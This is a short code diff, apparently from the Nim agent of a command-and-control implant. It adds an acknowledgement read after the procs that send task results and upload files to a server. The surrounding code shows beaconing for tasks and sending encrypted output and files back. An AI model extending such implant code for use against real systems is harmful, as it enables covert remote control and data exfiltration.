@@ -160,6 +160,14 @@ proc beacon*(t: var AgentTransport): seq[TaskWire] =
   except:
     t.reconnect()
 
+proc recvAck(t: var AgentTransport) =
+  ## Read and discard the server's ACK. Must be called after every result/upload
+  ## send to keep the framing in sync — the server always responds with {"t":"ack"}.
+  try:
+    discard readFrame(t.sock)
+  except:
+    t.reconnect()
+
 proc sendResultAdmin*(t: var AgentTransport; taskId: int64;
                       output, errStr: string; isAdmin: bool) =
   try:
@@ -169,6 +177,7 @@ proc sendResultAdmin*(t: var AgentTransport; taskId: int64;
     let encB64 = base64.encode(cast[string](enc))
     let msg    = %*{"t": "result", "p": encB64}
     writeFrame(t.sock, $msg)
+    t.recvAck()
   except:
     t.reconnect()
 
@@ -185,6 +194,7 @@ proc uploadFile*(t: var AgentTransport; taskId: int64;
     let encB64 = base64.encode(cast[string](enc))
     let msg    = %*{"t": "upload", "p": encB64}
     writeFrame(t.sock, $msg)
+    t.recvAck()
   except:
     t.reconnect()
 
